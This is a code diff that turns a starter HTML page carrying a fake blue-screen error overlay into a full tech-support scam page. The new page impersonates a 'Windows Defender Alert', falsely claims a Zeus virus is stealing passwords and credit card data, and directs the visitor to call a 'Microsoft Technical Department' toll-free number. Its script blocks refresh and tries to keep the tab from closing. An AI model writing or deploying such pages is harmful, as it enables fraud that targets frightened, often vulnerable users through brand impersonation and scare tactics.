@@ -1,65 +1,116 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <title>Page</title>
-    <title>System Error - Critical</title>
-    <link href="style.css" rel="stylesheet" type="text/css" />
-  </head>
-  <body>
-    <main>
-    <div id="bsod" class="bsod-overlay">
-      <div class="bsod-content">
-        <div class="bsod-header">
-          <h1 class="bsod-title">SYSTEM ERROR</h1>
-          <p class="bsod-subtitle">A critical system error has occurred</p>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender Alert</title>
+    <style>
+        /* Global Styles */
+        body {
+            background-color: #0078D7;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .content {
+            flex: 1;
+        }
+
+        .content h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .content h2 {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .list {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .list ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .list li {
+            margin-bottom: 10px;
+        }
+
+        .description {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .call-to-action {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .windows-logo {
+            width: 100px;
+            height: 100px;
+            margin-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <h1>Windows Defender Alert : Zeus Virus Detected In Your Computer !!</h1>
+            <h2>Please Do Not Shut Down or Reset Your Computer.</h2>
+            <div class="list">
+                <p>The following data will be compromised if you continue:</p>
+                <ul>
+                    <li>Passwords</li>
+                    <li>Browser History</li>
+                    <li>Credit Card Information</li>
+                    <li>Local Hard Disk Files</li>
+                </ul>
+            </div>
+            <div class="description">
+                <p>The Zeus virus is a type of malware that steals identity and credit card information. If you continue to use your computer, further action may reveal private information.</p>
+            </div>
+            <div class="call-to-action">
+                Call Microsoft Technical Department: <a href="tel:8882027560">(888) 202-7560 (Toll Free)</a>
+            </div>
         </div>
-        
-        <div class="bsod-error">
-          <div class="error-code">0x0000007E</div>
-          <div class="error-description">WIN32K.SYS - IRQL_NOT_LESS_OR_EQUAL</div>
-          <div class="error-details">
-            <p>An attempt was made to access a memory location that was not properly allocated, 
-              or a kernel-mode driver tried to perform an invalid operation on an object that 
-              had already been released.</p>
-          </div>
-        </div>
-        
-        <div class="bsod-contact">
-          <h2>Technical Support Contact</h2>
-          <p>If this problem occurs repeatedly, please contact technical support:</p>
-          <p class="support-phone">1-800-555-ERROR</p>
-          <p>Reference: 2023-11-15-1432-A1B2C3D4</p>
-        </div>
-        
-        <div class="bsod-footer">
-          <p>This error has been logged. Please restart your computer to continue.</p>
-        </div>
-      </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_-_2022.svg/1200px-Windows_logo_-_2022.svg.png" alt="Windows Logo" class="windows-logo">
     </div>
-    
-    <main class="content">
-      <h1 class="title">Welcome to my site!</h1>
-      <p class="description">
-        Get started by editing <code class="code">index.html</code>.
-      </p>
-      <section class="grid">
-        <a href="https://www.w3schools.com/html/" class="card">
-          <h2>Learn HTML &rarr;</h2>
-          <p>Find tutorials on W3Schools to learn HTML.</p>
-        </a>
-        <a
-          href="https://developer.mozilla.org/en-US/docs/Web/HTML"
-          class="card"
-        >
-          <h2>HTML Documentation &rarr;</h2>
-          <p>Explore the MDN Web Docs for in-depth HTML documentation.</p>
-        </a>
-      </section>
-    </main>
-    
-    <script type="module" src="script.js"></script>
-  </body>
+
+    <script>
+        // Prevent closing the browser tab or window using standard UI elements
+        window.onbeforeunload = function() {
+            return "";
+        };
+
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "F5") {
+                event.preventDefault();
+            }
+        });
+
+        window.onkeydown = function(event) {
+            if (event.ctrlKey && event.altKey && event.key === "Delete") {
+                window.close();
+            }
+        };
+    </script>
+</body>
 </html>
